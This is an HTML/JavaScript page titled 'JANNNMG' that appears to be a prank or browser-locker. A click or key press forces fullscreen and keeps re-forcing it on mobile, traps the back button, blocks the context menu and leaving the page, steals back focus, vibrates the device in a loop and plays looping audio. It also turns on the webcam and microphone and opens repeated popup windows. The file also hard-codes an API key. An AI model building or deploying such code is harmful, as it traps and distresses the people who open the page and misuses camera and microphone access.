<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>JANNNMG</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
            font-family: 'Times New Roman', Times, serif;
            -webkit-user-select: none;
            user-select: none;
            -webkit-touch-callout: none;
        }
        .main-container {
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #mainButton {
            width: 480px;
            height: 300px;
            cursor: pointer;
            border: 5px solid #333;
            background-size: cover;
            background-position: center;
            position: relative;
            overflow: hidden;
            transition: transform 0.2s ease;
        }
        #mainButton:hover {
            transform: scale(1.05);
        }
        #centerClick {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 84px;
            font-weight: bold;
            color: white;
            text-shadow: 2px 2px 8px #000;
            z-index: 100;
            font-family: 'Times New Roman', Times, serif;
        }
        .random-image {
            position: absolute;
            object-fit: cover;
            border: 2px solid rgba(0,0,0,0.3);
            z-index: 1;
        }
        #fullscreenContent {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('assets/game-over.gif');
            background-size: cover;
            background-position: center;
            display: none;
            z-index: 1000;
            cursor: pointer;
        }
        #webcamFeed {
            position: absolute;
            bottom: 20px;
            right: 20px;
            width: 250px;
            height: auto;
            border: 3px solid white;
            border-radius: 10px;
            z-index: 1001;
            transform: scaleX(-1);
        }
    </style>
</head>
<body>

    <div class="main-container">
        <button id="mainButton">
        </button>
    </div>

    <div id="fullscreenContent">
        <audio id="bgMusic" loop>
            <source src="assets/game-over-sound.mp3" type="audio/mpeg">
        </audio>
    </div>

    <script>
        document.title = 'JANNNMG';

        const isMobileDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
        let sessionActive = false;
        let mediaStream = null;

        const mainButton = document.getElementById('mainButton');
        const fullscreenContent = document.getElementById('fullscreenContent');
        const bgMusic = document.getElementById('bgMusic');

        const gifKeywords = [
            'glitch', 'surreal', 'abstract', 'psychedelic', 'trippy', 'weird', 'strange art', 'unexplained', 'anomaly', 'cosmic horror',
            'eldritch', 'fractal', 'kaleidoscope', 'subconscious', 'distorted', 'melting', 'void', 'liminal space', 'interdimensional', 'bioluminescent',
            'geometric patterns', 'hypnotic', 'optical illusion', 'vaporwave', 'synthwave', 'robot dance', 'toaster explosion', 'chaos', 'entropy', 'quantum foam'
        ];

        const GIPHY_API_KEY = 'GlVGYHkr3WSBnllca54iNt0yFbjz7L65';

        async function setupWebcam() {
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const videoElement = document.createElement('video');
                videoElement.id = 'webcamFeed';
                videoElement.srcObject = mediaStream;
                videoElement.autoplay = true;
                videoElement.muted = true;
                fullscreenContent.appendChild(videoElement);
                console.log("Webcam successfully connected.");
                return mediaStream;
            } catch (error) {
                console.error("Error accessing webcam:", error);
                return null;
            }
        }

        function initializeApp() {
            if (sessionActive) return;
            sessionActive = true;

            startSession();
            requestFullScreenMode();
            fullscreenContent.style.display = 'block';
            bgMusic.play();
            startVibrationLoop();
            setupWebcam();
        }

        function startVibrationLoop() {
            if ('vibrate' in navigator) {
                setInterval(() => {
                    navigator.vibrate([500, 1000]);
                }, 1500);
            }
        }

        function generateRandomColor() {
            const letters = '0123456789ABCDEF';
            let color = '#';
            for (let i = 0; i < 6; i++) {
                color += letters[Math.floor(Math.random() * 16)];
            }
            return color;
        }

        async function getRandomGif() {
            try {
                const randomKeyword = gifKeywords[Math.floor(Math.random() * gifKeywords.length)];
                const response = await fetch(`https://api.giphy.com/v1/gifs/random?api_key=${GIPHY_API_KEY}&tag=${randomKeyword}&rating=g`);
                const data = await response.json();
                return data.data.images.fixed_height.url;
            } catch (error) {
                console.error('Error fetching GIF:', error);
                const randomSeed = Math.random().toString(36).substring(2, 15);
                return `https://picsum.photos/seed/${randomSeed}/200/200.jpg`;
            }
        }

        function getLocalGif(index) {
            return `assets/local-gif-${index}.gif`;
        }

        async function setRandomButtonContent() {
            mainButton.style.cursor = 'wait';
            mainButton.style.backgroundColor = generateRandomColor();
            mainButton.innerHTML = '';

            const numberOfGifs = 8;
            const numberOfImages = 8;
            const gifPromises = [];

            for (let i = 0; i < numberOfGifs; i++) {
                const useLocalGif = Math.random() > 0.7;
                
                if (useLocalGif) {
                    gifPromises.push(Promise.resolve(getLocalGif(i % 5 + 1)));
                } else {
                    gifPromises.push(getRandomGif());
                }
            }

            try {
                const gifUrls = await Promise.all(gifPromises);
                
                for (let i = 0; i < numberOfGifs; i++) {
                    const randomWidth = Math.floor(Math.random() * 150) + 50;
                    const randomHeight = Math.floor(Math.random() * 150) + 50;
                    
                    const centerX = Math.random() * mainButton.offsetWidth;
                    const centerY = Math.random() * mainButton.offsetHeight;
                    
                    const img = document.createElement('img');
                    img.classList.add('random-image');
                    img.style.width = `${randomWidth}px`;
                    img.style.height = `${randomHeight}px`;
                    img.style.left = `${centerX - randomWidth / 2}px`;
                    img.style.top = `${centerY - randomHeight / 2}px`;
                    img.style.objectFit = 'cover';
                    
                    img.src = gifUrls[i];
                    
                    img.onerror = function() {
                        const randomSeed = Math.random().toString(36).substring(2, 15);
                        this.src = `https://picsum.photos/seed/${randomSeed}/${randomWidth}/${randomHeight}.jpg`;
                    };
                    
                    mainButton.appendChild(img);
                }

                for (let i = 0; i < numberOfImages; i++) {
                    const randomWidth = Math.floor(Math.random() * 150) + 50;
                    const randomHeight = Math.floor(Math.random() * 150) + 50;
                    
                    const centerX = Math.random() * mainButton.offsetWidth;
                    const centerY = Math.random() * mainButton.offsetHeight;
                    
                    const img = document.createElement('img');
                    img.classList.add('random-image');
                    const randomSeed = Math.random().toString(36).substring(2, 15);
                    img.src = `https://picsum.photos/seed/${randomSeed}/${randomWidth}/${randomHeight}.jpg`;
                    img.style.width = `${randomWidth}px`;
                    img.style.height = `${randomHeight}px`;
                    img.style.left = `${centerX - randomWidth / 2}px`;
                    img.style.top = `${centerY - randomHeight / 2}px`;
                    img.style.objectFit = 'cover';
                    
                    mainButton.appendChild(img);
                }

            } catch (error) {
                console.error('Error setting button content:', error);
                for (let i = 0; i < 16; i++) {
                    const img = document.createElement('img');
                    img.classList.add('random-image');
                    const randomSeed = Math.random().toString(36).substring(2, 15);
                    const randomWidth = Math.floor(Math.random() * 150) + 50;
                    const randomHeight = Math.floor(Math.random() * 150) + 50;
                    img.src = `https://picsum.photos/seed/${randomSeed}/${randomWidth}/${randomHeight}.jpg`;
                    img.style.width = `${randomWidth}px`;
                    img.style.height = `${randomHeight}px`;
                    
                    const centerX = Math.random() * mainButton.offsetWidth;
                    const centerY = Math.random() * mainButton.offsetHeight;
                    img.style.left = `${centerX - randomWidth / 2}px`;
                    img.style.top = `${centerY - randomHeight / 2}px`;
                    
                    mainButton.appendChild(img);
                }
            }

            const centerClickSpan = document.createElement('span');
            centerClickSpan.id = 'centerClick';
            centerClickSpan.innerText = 'click';
            mainButton.appendChild(centerClickSpan);
            
            mainButton.style.cursor = 'pointer';
        }

        function requestFullScreenMode() {
            const elem = document.documentElement;
            if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement) {
                if (elem.requestFullscreen) {
                    elem.requestFullscreen().catch(err => {});
                } else if (elem.webkitRequestFullscreen) {
                    elem.webkitRequestFullscreen();
                } else if (elem.msRequestFullscreen) {
                    elem.msRequestFullscreen();
                } else if (elem.mozRequestFullScreen) {
                    elem.mozRequestFullScreen();
                }
            }
        }

        function startSession() {
            history.pushState(null, null, location.href);
            window.addEventListener('popstate', function (event) {
                history.pushState(null, null, location.href);
            });

            window.addEventListener('beforeunload', function (e) {
                const message = "?";
                e.preventDefault();
                e.returnValue = message;
                return message;
            });

            document.addEventListener('contextmenu', e => e.preventDefault());

            window.addEventListener('blur', () => {
                setTimeout(() => window.focus(), 0);
            });

            if (isMobileDevice) {
                const stateCheckInterval = setInterval(() => {
                    if (sessionActive) {
                        requestFullScreenMode();
                    }
                }, 100);
            }
        }

        function triggerFullScreen() {
            sessionStorage.setItem('sessionActive', 'true');
            initializeApp();
        }

        function openPopupWindow() {
            const popup = window.open('popup.html', 'popup_' + Date.now(), 'width=350,height=350,resizable=no,scrollbars=no,toolbar=no');
            if (popup) {
                popup.postMessage({ action: 'startWebcam' }, '*');
            }
        }

        fullscreenContent.addEventListener('click', function() {
            if (!isMobileDevice) {
                openPopupWindow();
            }
        });
        
        document.addEventListener('fullscreenchange', function() {
            if (!document.fullscreenElement && fullscreenContent.style.display === 'block') {
                if (!isMobileDevice) {
                    openPopupWindow();
                }
            }
        });

        document.addEventListener('DOMContentLoaded', () => {
            setRandomButtonContent();
            mainButton.addEventListener('click', triggerFullScreen);
            document.addEventListener('keydown', triggerFullScreen);

            if (sessionStorage.getItem('sessionActive') === 'true') {
                initializeApp();
            }
        });
    </script>
</body>
</html>
